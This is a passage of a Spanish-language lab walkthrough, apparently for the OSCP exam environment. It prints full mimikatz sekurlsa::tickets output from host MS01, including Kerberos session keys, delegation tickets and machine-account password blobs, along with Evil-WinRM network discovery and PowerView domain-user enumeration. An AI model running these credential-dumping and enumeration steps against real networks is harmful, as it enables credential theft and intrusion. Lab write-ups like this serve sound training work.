| MS01\$                          | OSCP        | a913a6db3451444d9dfe26db3f8a8df4 | S-1-5-20                                       | Cuenta máquina, usado en kerberos |
| (varios: DWM-1, UMFD-1, UMFD-0) | OSCP        | a913a6db3451444d9dfe26db3f8a8df4 | S-1-5-96-0-x, S-1-5-18, S-1-5-20               | Son sesiones del servicio         |

#### Tickets:

```powershell
mimikatz # sekurlsa::tickets
                                                                                                                                                                                                                  
Authentication Id : 0 ; 2257479 (00000000:00227247)                                                                                                                                                               
Session           : Network from 0                                                                                                                                                                                
User Name         : eric.wallows                                                                                                                                                                                  
Domain            : OSCP                                                                                                                                                                                          
Logon Server      : DC01                                                                                                                                                                                          
Logon Time        : 7/25/2025 6:02:23 AM                                                                                                                                                                          
SID               : S-1-5-21-2610934713-1581164095-2706428072-7605                                                                                                                                                
                                                                                                                                                                                                                  
         * Username : eric.wallows                                                                                                                                                                                
         * Domain   : oscp.exam                                                                                                                                                                                   
         * Password : (null)                                                                                                                                                                                      

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 7/25/2025 6:02:24 AM ; 7/25/2025 6:17:24 AM ; 8/1/2025 5:04:09 AM
           Service Name (01) : ms01$ ; @ (null)
           Target Name  (10) : eric.wallows ; @ (null)
           Client Name  (10) : eric.wallows ; @ oscp.exam
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
           Session Key       : 0x00000001 - des_cbc_crc      
             f5ac274fe2e4c8131b58c976f23b5810f525d2da075820656690796c342e822b
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 6        [...]

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 416925 (00000000:00065c9d)
Session           : Interactive from 1
User Name         : celia.almeda
Domain            : OSCP
Logon Server      : DC01
Logon Time        : 2/12/2025 2:30:33 PM
SID               : S-1-5-21-2610934713-1581164095-2706428072-1105

         * Username : celia.almeda
         * Domain   : OSCP.EXAM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 7/25/2025 5:32:13 AM ; 7/25/2025 3:04:34 PM ; 8/1/2025 5:04:34 AM
           Service Name (02) : ProtectedStorage ; DC01.oscp.exam ; @ OSCP.EXAM
           Target Name  (02) : ProtectedStorage ; DC01.oscp.exam ; @ OSCP.EXAM
           Client Name  (01) : celia.almeda ; @ OSCP.EXAM
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
           Session Key       : 0x00000001 - des_cbc_crc      
             b61cdda054e75ce3911b70f02acf78358ae0cad66923ef8cf7668503a5ca9693
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8        [...]
         [00000001]
           Start/End/MaxRenew: 7/25/2025 5:32:13 AM ; 7/25/2025 3:04:34 PM ; 8/1/2025 5:04:34 AM
           Service Name (02) : cifs ; DC01.oscp.exam ; @ OSCP.EXAM
           Target Name  (02) : cifs ; DC01.oscp.exam ; @ OSCP.EXAM
           Client Name  (01) : celia.almeda ; @ OSCP.EXAM
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
           Session Key       : 0x00000001 - des_cbc_crc      
             7916dcd894d05da692549f522cdbb31faa33627b2f98cc992c30866bb3d834e1
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8        [...]
         [00000002]
           Start/End/MaxRenew: 7/25/2025 5:04:34 AM ; 7/25/2025 3:04:34 PM ; 8/1/2025 5:04:34 AM
           Service Name (02) : LDAP ; DC01.oscp.exam ; oscp.exam ; @ OSCP.EXAM
           Target Name  (02) : LDAP ; DC01.oscp.exam ; oscp.exam ; @ OSCP.EXAM
           Client Name  (01) : celia.almeda ; @ OSCP.EXAM ( OSCP.EXAM )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
           Session Key       : 0x00000001 - des_cbc_crc      
             9675d606ec3eb6f6259dbc0373810b9e79ab93952d3aeea4b0275c4b9156ccb4
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8        [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/25/2025 5:32:13 AM ; 7/25/2025 3:04:34 PM ; 8/1/2025 5:04:34 AM
           Service Name (02) : krbtgt ; OSCP.EXAM ; @ OSCP.EXAM
           Target Name  (--) : @ OSCP.EXAM
           Client Name  (01) : celia.almeda ; @ OSCP.EXAM ( $$Delegation Ticket$$ )
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; 
           Session Key       : 0x00000001 - des_cbc_crc      
             76c735bc4050e6b089499f9fedf83e30538373f5b817c2cc59f6a89c17330396
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
         [00000001]
           Start/End/MaxRenew: 7/25/2025 5:04:34 AM ; 7/25/2025 3:04:34 PM ; 8/1/2025 5:04:34 AM
           Service Name (02) : krbtgt ; OSCP.EXAM ; @ OSCP.EXAM
           Target Name  (02) : krbtgt ; OSCP.EXAM ; @ OSCP.EXAM
           Client Name  (01) : celia.almeda ; @ OSCP.EXAM ( OSCP.EXAM )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 
           Session Key       : 0x00000001 - des_cbc_crc      
             d2fe278ed56f325491b12d7902c1ac8f79de16db62265c157980d46b832dd1bc
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]

Authentication Id : 0 ; 123814 (00000000:0001e3a6)
Session           : Service from 0
User Name         : Mary.Williams
Domain            : MS01
Logon Server      : MS01
Logon Time        : 2/12/2025 2:30:09 PM
SID               : S-1-5-21-2114389728-3978811169-1968162427-1002

         * Username : Mary.Williams
         * Domain   : MS01
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 122914 (00000000:0001e022)
Session           : Service from 0
User Name         : Mary.Williams
Domain            : MS01
Logon Server      : MS01
Logon Time        : 2/12/2025 2:30:09 PM
SID               : S-1-5-21-2114389728-3978811169-1968162427-1002

         * Username : Mary.Williams
         * Domain   : MS01
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 122710 (00000000:0001df56)
Session           : Service from 0
User Name         : Mary.Williams
Domain            : MS01
Logon Server      : MS01
Logon Time        : 2/12/2025 2:30:09 PM
SID               : S-1-5-21-2114389728-3978811169-1968162427-1002

         * Username : Mary.Williams
         * Domain   : MS01
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 84452 (00000000:000149e4)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/12/2025 2:30:08 PM
SID               : S-1-5-90-0-1

         * Username : MS01$
         * Domain   : oscp.exam
         * Password : 8b 01 33 23 1b f7 2a 1a 2d 04 c7 f3 6c 19 9a 18 75 aa 83 20 c5 ca 3a 47 93 e9 f6 df 9b 69 9f f0 78 5d ab 0a c0 c3 a6 27 e4 8f 5d 53 5e ef 0d 96 53 58 22 52 12 5c 43 f3 a7 c3 e3 86 3f b7 1d de 06 2e 29 e2 08 f8 d0 c2 f4 a7 bc 27 50 eb d1 58 68 b2 80 8c 45 55 fe 15 78 66 13 73 92 73 9e cb 18 2e c2 4d a3 2c 2e ef 2c 14 05 4f e4 a6 5b 0b a2 58 78 0e a0 6b a1 6c b9 89 af 6e 88 15 c5 a6 23 76 a4 08 4e 01 47 3d 1a f1 d0 89 89 b9 4e 8f b1 91 2a f9 8c e1 de d4 45 2e 92 9a d5 71 bc d1 e4 2b 51 34 bc bc cf 7f 71 1e 29 5a 79 af 48 9c a7 d6 40 26 f5 67 cf f4 56 02 32 88 47 76 4d a1 b3 62 c7 71 45 36 71 44 68 3a c2 09 7a f6 3e a7 d2 df 15 8f 24 fe b0 d0 f1 f0 d3 47 d5 36 ef 3d b8 d1 94 3e 09 e9 e2 1e 1a 48 aa c6 c4 30 52 2b 

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 84433 (00000000:000149d1)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/12/2025 2:30:08 PM
SID               : S-1-5-90-0-1

         * Username : MS01$
         * Domain   : oscp.exam
         * Password : ec 3f f3 28 b2 fe 85 c4 b0 4b 82 8b 38 c1 1d 2a b4 2a 57 eb bc 55 c9 a6 fd 89 af 26 46 c2 69 23 3d ec 16 b0 58 39 e7 09 fd 0f 2d a1 93 1c 4d af 23 e7 1d 95 e2 0c 33 04 f7 e8 ed 48 9f b1 83 b3 fb 12 b1 7f 61 a3 de 8d 44 1b 39 80 78 50 f0 96 98 ac 52 86 3b 03 bb 61 fc 00 94 09 89 75 db c7 34 0c b9 b0 e2 f2 5d 0c 0b 72 52 36 50 6e 91 1d 70 db 56 0e 75 b5 8c 3f 8a 81 56 83 d3 a6 a0 04 88 d0 cd fd 1f 7b 7c c0 32 3f 54 37 b8 d0 2b 98 d1 6e 81 01 3c f5 d9 b9 ad 0f e7 81 fa 03 03 b0 86 3d b2 5f 1d 44 4e 14 b2 08 30 b8 4a af e2 45 87 10 a1 39 6c cf 34 93 9a 3f 0c c2 02 87 0b 08 2d c0 cd d0 d2 ae 23 df 74 f5 c6 4c 6a 9e 35 9c 8c a0 97 d8 0d ef 71 90 e4 b3 08 eb 1b 58 10 9f 36 f2 49 2b bb 36 b4 8d 32 80 b7 9f f8 47 0a 9d 

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2/12/2025 2:30:08 PM
SID               : S-1-5-19

         * Username : (null)
         * Domain   : (null)
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MS01$
Domain            : OSCP
Logon Server      : (null)
Logon Time        : 2/12/2025 2:30:08 PM
SID               : S-1-5-20

         * Username : ms01$
         * Domain   : OSCP.EXAM
         * Password : ec 3f f3 28 b2 fe 85 c4 b0 4b 82 8b 38 c1 1d 2a b4 2a 57 eb bc 55 c9 a6 fd 89 af 26 46 c2 69 23 3d ec 16 b0 58 39 e7 09 fd 0f 2d a1 93 1c 4d af 23 e7 1d 95 e2 0c 33 04 f7 e8 ed 48 9f b1 83 b3 fb 12 b1 7f 61 a3 de 8d 44 1b 39 80 78 50 f0 96 98 ac 52 86 3b 03 bb 61 fc 00 94 09 89 75 db c7 34 0c b9 b0 e2 f2 5d 0c 0b 72 52 36 50 6e 91 1d 70 db 56 0e 75 b5 8c 3f 8a 81 56 83 d3 a6 a0 04 88 d0 cd fd 1f 7b 7c c0 32 3f 54 37 b8 d0 2b 98 d1 6e 81 01 3c f5 d9 b9 ad 0f e7 81 fa 03 03 b0 86 3d b2 5f 1d 44 4e 14 b2 08 30 b8 4a af e2 45 87 10 a1 39 6c cf 34 93 9a 3f 0c c2 02 87 0b 08 2d c0 cd d0 d2 ae 23 df 74 f5 c6 4c 6a 9e 35 9c 8c a0 97 d8 0d ef 71 90 e4 b3 08 eb 1b 58 10 9f 36 f2 49 2b bb 36 b4 8d 32 80 b7 9f f8 47 0a 9d 

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 7/25/2025 5:05:05 AM ; 7/25/2025 3:04:11 PM ; 8/1/2025 5:04:11 AM
           Service Name (02) : cifs ; DC01.oscp.exam ; @ OSCP.EXAM
           Target Name  (02) : cifs ; DC01.oscp.exam ; @ OSCP.EXAM
           Client Name  (01) : MS01$ ; @ OSCP.EXAM
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
           Session Key       : 0x00000001 - des_cbc_crc      
             b3b601017d950b764b7a96e13b8c8d92ecedbf2a1ae2d566c4a356d41a4546c7
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8        [...]
         [00000001]
           Start/End/MaxRenew: 7/25/2025 5:04:12 AM ; 7/25/2025 3:04:11 PM ; 8/1/2025 5:04:11 AM
           Service Name (02) : ldap ; dc01.oscp.exam ; @ OSCP.EXAM
           Target Name  (02) : ldap ; dc01.oscp.exam ; @ OSCP.EXAM
           Client Name  (01) : MS01$ ; @ OSCP.EXAM
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
           Session Key       : 0x00000001 - des_cbc_crc      
             a71e035cde07d4bc57dcf55c59f60ffe22ac7863eac666f2b00c7d8a60ae515a
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8        [...]
         [00000002]
           Start/End/MaxRenew: 7/25/2025 5:04:11 AM ; 7/25/2025 3:04:11 PM ; 8/1/2025 5:04:11 AM
           Service Name (02) : DNS ; dc01.oscp.exam ; @ OSCP.EXAM
           Target Name  (02) : DNS ; dc01.oscp.exam ; @ OSCP.EXAM
           Client Name  (01) : MS01$ ; @ OSCP.EXAM
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
           Session Key       : 0x00000001 - des_cbc_crc      
             c282702b2301b7671d925dba7343fbebdf768094ff0711d55ace635c05d57115
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8        [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/25/2025 5:04:11 AM ; 7/25/2025 3:04:11 PM ; 8/1/2025 5:04:11 AM
           Service Name (02) : krbtgt ; OSCP.EXAM ; @ OSCP.EXAM
           Target Name  (--) : @ OSCP.EXAM
           Client Name  (01) : MS01$ ; @ OSCP.EXAM ( $$Delegation Ticket$$ )
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; 
           Session Key       : 0x00000001 - des_cbc_crc      
             8844c1d40ef70c88e0073be434944e592a60941be109939b746a1d4e173e0ee3
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
         [00000001]
           Start/End/MaxRenew: 7/25/2025 5:04:11 AM ; 7/25/2025 3:04:11 PM ; 8/1/2025 5:04:11 AM
           Service Name (02) : krbtgt ; OSCP.EXAM ; @ OSCP.EXAM
           Target Name  (02) : krbtgt ; oscp.exam ; @ OSCP.EXAM
           Client Name  (01) : MS01$ ; @ OSCP.EXAM ( oscp.exam )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 
           Session Key       : 0x00000001 - des_cbc_crc      
             d3a19b856f0cc5a19e719d63996e55774798e895cf0c350514b7bec9fe5afbd8
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]

Authentication Id : 0 ; 48204 (00000000:0000bc4c)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/12/2025 2:30:08 PM
SID               : S-1-5-96-0-1

         * Username : MS01$
         * Domain   : oscp.exam
         * Password : ec 3f f3 28 b2 fe 85 c4 b0 4b 82 8b 38 c1 1d 2a b4 2a 57 eb bc 55 c9 a6 fd 89 af 26 46 c2 69 23 3d ec 16 b0 58 39 e7 09 fd 0f 2d a1 93 1c 4d af 23 e7 1d 95 e2 0c 33 04 f7 e8 ed 48 9f b1 83 b3 fb 12 b1 7f 61 a3 de 8d 44 1b 39 80 78 50 f0 96 98 ac 52 86 3b 03 bb 61 fc 00 94 09 89 75 db c7 34 0c b9 b0 e2 f2 5d 0c 0b 72 52 36 50 6e 91 1d 70 db 56 0e 75 b5 8c 3f 8a 81 56 83 d3 a6 a0 04 88 d0 cd fd 1f 7b 7c c0 32 3f 54 37 b8 d0 2b 98 d1 6e 81 01 3c f5 d9 b9 ad 0f e7 81 fa 03 03 b0 86 3d b2 5f 1d 44 4e 14 b2 08 30 b8 4a af e2 45 87 10 a1 39 6c cf 34 93 9a 3f 0c c2 02 87 0b 08 2d c0 cd d0 d2 ae 23 df 74 f5 c6 4c 6a 9e 35 9c 8c a0 97 d8 0d ef 71 90 e4 b3 08 eb 1b 58 10 9f 36 f2 49 2b bb 36 b4 8d 32 80 b7 9f f8 47 0a 9d 

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 48153 (00000000:0000bc19)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/12/2025 2:30:08 PM
SID               : S-1-5-96-0-0

         * Username : MS01$
         * Domain   : oscp.exam
         * Password : ec 3f f3 28 b2 fe 85 c4 b0 4b 82 8b 38 c1 1d 2a b4 2a 57 eb bc 55 c9 a6 fd 89 af 26 46 c2 69 23 3d ec 16 b0 58 39 e7 09 fd 0f 2d a1 93 1c 4d af 23 e7 1d 95 e2 0c 33 04 f7 e8 ed 48 9f b1 83 b3 fb 12 b1 7f 61 a3 de 8d 44 1b 39 80 78 50 f0 96 98 ac 52 86 3b 03 bb 61 fc 00 94 09 89 75 db c7 34 0c b9 b0 e2 f2 5d 0c 0b 72 52 36 50 6e 91 1d 70 db 56 0e 75 b5 8c 3f 8a 81 56 83 d3 a6 a0 04 88 d0 cd fd 1f 7b 7c c0 32 3f 54 37 b8 d0 2b 98 d1 6e 81 01 3c f5 d9 b9 ad 0f e7 81 fa 03 03 b0 86 3d b2 5f 1d 44 4e 14 b2 08 30 b8 4a af e2 45 87 10 a1 39 6c cf 34 93 9a 3f 0c c2 02 87 0b 08 2d c0 cd d0 d2 ae 23 df 74 f5 c6 4c 6a 9e 35 9c 8c a0 97 d8 0d ef 71 90 e4 b3 08 eb 1b 58 10 9f 36 f2 49 2b bb 36 b4 8d 32 80 b7 9f f8 47 0a 9d 

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MS01$
Domain            : OSCP
Logon Server      : (null)
Logon Time        : 2/12/2025 2:30:08 PM
SID               : S-1-5-18

         * Username : ms01$
         * Domain   : OSCP.EXAM
         * Password : ec 3f f3 28 b2 fe 85 c4 b0 4b 82 8b 38 c1 1d 2a b4 2a 57 eb bc 55 c9 a6 fd 89 af 26 46 c2 69 23 3d ec 16 b0 58 39 e7 09 fd 0f 2d a1 93 1c 4d af 23 e7 1d 95 e2 0c 33 04 f7 e8 ed 48 9f b1 83 b3 fb 12 b1 7f 61 a3 de 8d 44 1b 39 80 78 50 f0 96 98 ac 52 86 3b 03 bb 61 fc 00 94 09 89 75 db c7 34 0c b9 b0 e2 f2 5d 0c 0b 72 52 36 50 6e 91 1d 70 db 56 0e 75 b5 8c 3f 8a 81 56 83 d3 a6 a0 04 88 d0 cd fd 1f 7b 7c c0 32 3f 54 37 b8 d0 2b 98 d1 6e 81 01 3c f5 d9 b9 ad 0f e7 81 fa 03 03 b0 86 3d b2 5f 1d 44 4e 14 b2 08 30 b8 4a af e2 45 87 10 a1 39 6c cf 34 93 9a 3f 0c c2 02 87 0b 08 2d c0 cd d0 d2 ae 23 df 74 f5 c6 4c 6a 9e 35 9c 8c a0 97 d8 0d ef 71 90 e4 b3 08 eb 1b 58 10 9f 36 f2 49 2b bb 36 b4 8d 32 80 b7 9f f8 47 0a 9d 

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 7/25/2025 5:54:35 AM ; 7/25/2025 3:04:09 PM ; 8/1/2025 5:04:09 AM
           Service Name (02) : cifs ; DC01.oscp.exam ; oscp.exam ; @ OSCP.EXAM
           Target Name  (02) : cifs ; DC01.oscp.exam ; oscp.exam ; @ OSCP.EXAM
           Client Name  (01) : MS01$ ; @ OSCP.EXAM ( oscp.exam )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
           Session Key       : 0x00000001 - des_cbc_crc      
             d0b3bbc52ce3612d2742bbbf2d0e474ba72526938df43abfca3a60b5a832f265
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8        [...]
         [00000001]
           Start/End/MaxRenew: 7/25/2025 5:54:34 AM ; 7/25/2025 3:04:09 PM ; 8/1/2025 5:04:09 AM
           Service Name (01) : MS01$ ; @ OSCP.EXAM
           Target Name  (01) : MS01$ ; @ OSCP.EXAM
           Client Name  (01) : MS01$ ; @ OSCP.EXAM
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
           Session Key       : 0x00000001 - des_cbc_crc      
             e768df49de49c52d69ba96633808810a3901a2c763da3cca966474058468eaad
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 6        [...]
         [00000002]
           Start/End/MaxRenew: 7/25/2025 5:04:09 AM ; 7/25/2025 3:04:09 PM ; 8/1/2025 5:04:09 AM
           Service Name (02) : ldap ; DC01.oscp.exam ; oscp.exam ; @ OSCP.EXAM
           Target Name  (02) : ldap ; DC01.oscp.exam ; oscp.exam ; @ OSCP.EXAM
           Client Name  (01) : MS01$ ; @ OSCP.EXAM ( OSCP.EXAM )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
           Session Key       : 0x00000001 - des_cbc_crc      
             ccb0de022d11b5d0d7a3de74f1aae6d1e3c0c4456a9539dd6f3cf53b4e859e11
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8        [...]

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 7/25/2025 6:02:24 AM ; 7/25/2025 6:17:24 AM ; 8/1/2025 5:04:09 AM
           Service Name (01) : ms01$ ; @ (null)
           Target Name  (10) : eric.wallows ; @ (null)
           Client Name  (10) : eric.wallows ; @ oscp.exam
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
           Session Key       : 0x00000001 - des_cbc_crc      
             f5ac274fe2e4c8131b58c976f23b5810f525d2da075820656690796c342e822b
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 6        [...]

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/25/2025 5:54:35 AM ; 7/25/2025 3:04:09 PM ; 8/1/2025 5:04:09 AM
           Service Name (02) : krbtgt ; OSCP.EXAM ; @ OSCP.EXAM
           Target Name  (--) : @ OSCP.EXAM
           Client Name  (01) : MS01$ ; @ OSCP.EXAM ( $$Delegation Ticket$$ )
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; 
           Session Key       : 0x00000001 - des_cbc_crc      
             25775825adf76345020d50c3e4bc3b16422f8bd32d6158e47bf0f09459763732
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
         [00000001]
           Start/End/MaxRenew: 7/25/2025 5:04:09 AM ; 7/25/2025 3:04:09 PM ; 8/1/2025 5:04:09 AM
           Service Name (02) : krbtgt ; OSCP.EXAM ; @ OSCP.EXAM
           Target Name  (02) : krbtgt ; OSCP.EXAM ; @ OSCP.EXAM
           Client Name  (01) : MS01$ ; @ OSCP.EXAM ( OSCP.EXAM )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 
           Session Key       : 0x00000001 - des_cbc_crc      
             c81cf676e018c001de9a82eb8282651d05612bbb0a926ba4cbb19cf2d51f0d3a
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]

```
#### Inofrmacion Ordenada de sekurlsa::tikets

| # | User              | Domain           | Session             | Logon Server | Logon Time          | SID                   | Ticket Type   | Service(s)                   |
| - | ----------------- | ---------------- | ------------------- | ------------ | ------------------- | --------------------- | ------------- | ---------------------------- |
| 1 | **eric.wallows**  | oscp.exam        | Network             | DC01         | 2025-07-25 06:02:23 | S-1-5-21-2610...-7605 | TGS           | ms01\$                       |
| 2 | **celia.almeda**  | OSCP.EXAM        | Interactive         | DC01         | 2025-02-12 14:30:33 | S-1-5-21-2610...-1105 | TGS           | ProtectedStorage, cifs, LDAP |
| 3 | **Mary.Williams** | MS01             | Service             | MS01         | 2025-02-12 14:30:09 | S-1-5-21-2114...-1002 | (none listed) | (none listed)                |
| 4 | **DWM-1**         | Window Manager   | Interactive         | (null)       | 2025-02-12 14:30:08 | S-1-5-90-0-1          | (none listed) | (none listed)                |
| 5 | **UMFD-1**        | Font Driver Host | Interactive         | (null)       | 2025-02-12 14:30:08 | S-1-5-96-0-1          | (none listed) | (none listed)                |
| 6 | **UMFD-0**        | Font Driver Host | Interactive         | (null)       | 2025-02-12 14:30:08 | S-1-5-96-0-0          | (none listed) | (none listed)                |
| 7 | **LOCAL SERVICE** | NT AUTHORITY     | Service             | (null)       | 2025-02-12 14:30:08 | S-1-5-19              | (none listed) | (none listed)                |
| 8 | **MS01\$**        | OSCP.EXAM        | Service / Undefined | (null)       | 2025-02-12 14:30:08 | S-1-5-20 / S-1-5-18   | TGS           | cifs, ldap, DNS, krbtgt      |

> Con esta informacion podemos comenzar a apuntar hacia la red interna revisamos desde **eric.wallows**

```powershell
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> ipconfig
                                                                                                                                                                                                                  
Windows IP Configuration                                                                                                                                                                                          
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
Ethernet adapter Ethernet0:                                                                                                                                                                                       
                                                                                                                                                                                                                  
   Connection-specific DNS Suffix  . :                                                                                                                                                                            
   IPv4 Address. . . . . . . . . . . : 192.168.212.141                                                                                                                                                            
   Subnet Mask . . . . . . . . . . . : 255.255.255.0                                                                                                                                                              
   Default Gateway . . . . . . . . . : 192.168.212.254

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.10.172.141 <-- ip internal ruteada
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> 
```

> Subimos PowerView y enumeramos

```powershell
PS C:\Users\eric.wallows\Documents> Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetUser | select cn,pwdlastset,lastlogon

cn              pwdlastset             lastlogon            
--              ----------             ---------            
Administrator   3/25/2022 6:13:34 AM   8/2/2025 7:12:11 AM  
Guest           12/31/1600 4:00:00 PM  12/31/1600 4:00:00 PM
krbtgt          3/25/2022 7:43:58 AM   12/31/1600 4:00:00 PM
Celia Almeda    4/1/2022 9:25:03 AM    8/2/2025 6:51:48 AM  
Tom Kinney      4/1/2022 10:28:07 AM   12/31/1600 4:00:00 PM
Tom Admin       4/1/2022 10:30:56 AM   12/31/1600 4:00:00 PM
Leonard Morris  4/5/2022 4:22:38 AM    12/31/1600 4:00:00 PM
Sandra Craig    4/5/2022 4:22:38 AM    12/31/1600 4:00:00 PM
Chelsea Byrne   4/5/2022 4:22:38 AM    12/31/1600 4:00:00 PM
Luke Martin     4/5/2022 4:22:38 AM    12/31/1600 4:00:00 PM
Donna Johnson   4/5/2022 4:22:39 AM    12/31/1600 4:00:00 PM
Lawrence Kay    4/5/2022 4:22:48 AM    12/31/1600 4:00:00 PM
Emily Bishop    4/5/2022 4:22:49 AM    12/31/1600 4:00:00 PM
Linda Patel     4/5/2022 4:22:49 AM    12/31/1600 4:00:00 PM
Jamie Thomas    4/5/2022 4:22:49 AM    12/31/1600 4:00:00 PM
Shane Mitchell  4/5/2022 4:22:49 AM    12/31/1600 4:00:00 PM
Frank Farrell   4/5/2022 4:22:56 AM    12/31/1600 4:00:00 PM
Jane Booth      4/5/2022 4:22:56 AM    12/31/1600 4:00:00 PM
Joan North      4/5/2022 4:22:57 AM    12/31/1600 4:00:00 PM
Carol Webb      4/5/2022 4:23:03 AM    12/31/1600 4:00:00 PM
Kenneth Coles   4/5/2022 4:23:04 AM    12/31/1600 4:00:00 PM
Oliver Gray     4/5/2022 4:23:04 AM    12/31/1600 4:00:00 PM
Georgina Begum  4/5/2022 4:23:10 AM    12/31/1600 4:00:00 PM
Aimee Hunt      4/5/2022 4:23:10 AM    12/31/1600 4:00:00 PM
Thomas Robinson 4/5/2022 4:23:10 AM    12/31/1600 4:00:00 PM
Janice Turner   4/5/2022 4:23:10 AM    12/31/1600 4:00:00 PM
sql_svc         12/5/2022 5:49:44 AM   11/10/2022 3:15:51 AM
John Dorian     11/10/2022 12:07:38 AM 12/31/1600 4:00:00 PM
web_svc         11/10/2022 11:11:19 PM 11/14/2022 6:29:47 AM
Eric Wallows    2/3/2025 12:45:51 PM   12/31/1600 4:00:00 PM
```

### 📋 Tabla resumen de usuarios

| **Nombre completo** | **Username (samaccountname)** | **UPN / Email**                                             | **OU**     | **logoncount** | **Último logon**       |
| ------------------- | ----------------------------- | ----------------------------------------------------------- | ---------- | -------------- | ---------------------- |
| Administrator       | Administrator                 | –                                                           | Users      | 184            | 02/08/2025 07:12:11 AM |
| Guest               | Guest                         | –                                                           | Users      | 0              | 12/31/1600 4:00:00 PM  |
| krbtgt              | krbtgt                        | –                                                           | Users      | 0              | 12/31/1600 4:00:00 PM  |
| Celia Almeda        | celia.almeda                  | [celia.almeda@oscp.exam](mailto:celia.almeda@oscp.exam)     | Users      | 30             | 02/08/2025 06:51:48 AM |
| Tom Kinney          | tom.kinney                    | [tom.kinney@oscp.exam](mailto:tom.kinney@oscp.exam)         | Users      | 0              | 12/31/1600 4:00:00 PM  |
